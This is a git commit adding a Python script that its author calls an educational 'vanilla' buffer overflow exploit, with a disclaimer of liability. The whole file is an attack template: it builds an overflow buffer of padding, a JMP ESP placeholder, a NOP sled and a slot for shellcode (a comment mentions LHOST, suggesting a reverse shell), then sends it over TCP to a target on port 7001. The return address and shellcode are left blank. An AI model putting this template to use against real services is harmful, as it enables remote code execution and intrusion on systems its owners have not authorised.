031d956d68ba0b7adf4dfe8e35face40f4f45762
afsanity <49007301+afsanity@users.noreply.github.com>
2024-02-05 21:42:38 -0700

    Create Vanilla.py
    This is an example of a vanilla buffer overflow script. I am not liable if you choose to use this maliciously, this is for educational purposes only.

---
+++ Vanilla.py
@@ -0,0 +1,26 @@
+#!/usr/bin/python
+import socket
+import sys
+
+try:
+  print("\n[+] Sending buffer...")
+  target = sys.argv[1]
+  port = 7001
+  size = 2560
+
+  buffer = b"A"*2288
+  buffer += b" " #JMP ESP
+  buffer += b"C" * 8 # Buffer of C's before the ESP register
+  buffer += b"\x90" * 10 # NOP Sled to pass through decoder stub 
+  # Make sure to change the shellcode whenever LHOST changes 
+  buffer += bytearray(" ") # insert shellcode here 
+
+  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((target, port))
+  s.send(buffer)
+  s.close()
+  
+  print("\nDone!")
+  
+except:
+  print("\n [-] Error could not send buffer! ")
